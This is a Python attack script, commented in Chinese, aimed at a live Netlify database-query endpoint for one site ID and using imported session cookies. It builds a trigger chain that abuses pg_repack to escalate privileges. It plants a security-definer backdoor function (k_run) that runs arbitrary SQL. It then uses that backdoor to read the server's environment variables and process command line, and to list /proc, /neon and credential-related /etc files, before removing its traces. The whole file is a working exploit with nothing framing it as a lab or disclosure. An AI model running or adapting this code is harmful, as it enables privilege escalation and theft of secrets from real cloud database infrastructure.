# -*- coding: utf-8 -*-
"""波24:superuser 文件读收官 —— environ / 进程 / 目录结构
复用波23 全套链(建链 -> 埋 k_run -> 探测 -> 清理)
D1 /proc/self/environ(LATIN1 处理 NUL)
D2 /proc 进程列表 + PID1 cmdline
D3 /neon /neonvm /etc 布局
D4 /home 与 /var 下 neon 相关
D5 清理
"""
import http.client, ssl, gzip, brotli, json, sys, time, re
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:9000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


def build_chain(oid=None):
    """建源表->pk/log->evil->触发器;返回 oid。evil 内埋 k_run 后门"""
    evil = ("create or replace function public.k_evil() returns trigger language plpgsql as $q$ "
            "begin "
            "  begin execute 'drop table if exists public.k_pwned'; exception when others then null; end; "
            "  begin execute 'create table public.k_pwned as select current_user::text as u, session_user::text as su'; exception when others then null; end; "
            "  begin execute $f$create or replace function public.k_run(q text) returns setof text language plpgsql security definer as $z$ "
            "begin "
            "  begin "
            "    return query execute q; "
            "  exception when others then "
            "    execute q; "
            "    return query select 'OK'; "
            "  end; "
            "end $z$$f$; exception when others then null; end; "
            "  return new; "
            "end $q$")
    s, b, dt = tx(["drop table if exists k_src",
                   "create table k_src(id int, v text)",
                   "select 'OID='||oid||' NAME='||relname from pg_class where relname='k_src'"])
    m = re.search(r'OID=(\d+)', b)
    oid = m.group(1) if m else None
    if not oid:
        print('build_chain FAIL:', b[:400])
        return None
    s, b, dt = tx(["create type repack.pk_%s as (id int)" % oid,
                   "create table repack.log_%s (pk repack.pk_%s, row public.k_src)" % (oid, oid)])
    if s != 200:
        print('mktype FAIL:', b[:400])
        return None
    s, b, dt = tx(["drop trigger if exists k_log_trg on repack.log_%s" % oid,
                   "drop trigger if exists k_src_trg on k_src",
                   evil,
                   "create trigger k_log_trg after insert on repack.log_%s for each row execute function public.k_evil()" % oid,
                   "create trigger k_src_trg after insert on k_src for each row execute function repack.repack_trigger('id')",
                   "insert into k_src values (1, 'x')"])
    if s != 200:
        print('chain FAIL:', b[:600])
        return None
    return oid


def cleanup(oid):
    """重放链删 cloud_admin 对象(k_run/k_pwned)后自清理"""
    evil2 = ("create or replace function public.k_evil() returns trigger language plpgsql as $q$ "
             "begin "
             "  begin execute 'drop function if exists public.k_run cascade'; exception when others then null; end; "
             "  begin execute 'drop table if exists public.k_pwned'; exception when others then null; end; "
             "  return new; "
             "end $q$")
    tx(["drop trigger if exists k_src_trg on k_src",
        "drop trigger if exists k_log_trg on repack.log_%s" % oid,
        evil2,
        "create trigger k_src_trg after insert on k_src for each row execute function repack.repack_trigger('id')",
        "insert into k_src values (2, 'c')"])
    tx(["drop trigger if exists k_src_trg on k_src",
        "drop trigger if exists k_log_trg on repack.log_%s" % oid,
        "drop function if exists public.k_evil()",
        "drop table if exists repack.log_%s" % oid,
        "drop type if exists repack.pk_%s" % oid,
        "drop table if exists k_src"])


print('== 建链 + 埋后门 ==')
oid = build_chain()
if not oid:
    sys.exit(1)
print('chain ok oid=%s' % oid)

# 确认 k_run
s, b, dt = tx(["select * from public.k_run('select current_user::text')"])
print('verify           [%d] %s' % (s, b[:300]))

# D1: environ(LATIN1 逐字节 + NUL->换行)
s, b, dt = tx(["select * from public.k_run('select replace(convert_from(pg_read_binary_file(''/proc/self/environ''),''LATIN1''), chr(0), chr(10))')"])
print('D1_environ       [%d] %.1fs' % (s, dt))
print('   ' + b[:6000])
print()

# D2: 进程列表
s, b, dt = tx(["select * from public.k_run('select string_agg(x, chr(10)) from pg_ls_dir(''/proc'') x where x ~ ''^[0-9]+$'' order by x::int')"])
print('D2_pids          [%d] %.1fs' % (s, dt))
print('   ' + b[:1500])
print()

# D3: PID1 命令行
s, b, dt = tx(["select * from public.k_run('select replace(convert_from(pg_read_binary_file(''/proc/1/cmdline''),''LATIN1''), chr(0), chr(32))')"])
print('D3_pid1_cmd      [%d] %.1fs' % (s, dt))
print('   ' + b[:1500])
print()

# D4: /neon /neonvm 布局
s, b, dt = tx(["select * from public.k_run('select string_agg(x, chr(10)) from pg_ls_dir(''/neon'') x')"])
print('D4_neon_dir      [%d] %.1fs' % (s, dt))
print('   ' + b[:1000])
print()

# D5: /etc 下 neon/网络相关
s, b, dt = tx(["select * from public.k_run('select string_agg(x, chr(10)) from pg_ls_dir(''/etc'') x where x ~ ''neon|postgres|hosts|resolv|passwd|shadow|env''')"])
print('D5_etc           [%d] %.1fs' % (s, dt))
print('   ' + b[:1000])
print()

print('== 清理 ==')
cleanup(oid)
print('cleaned')
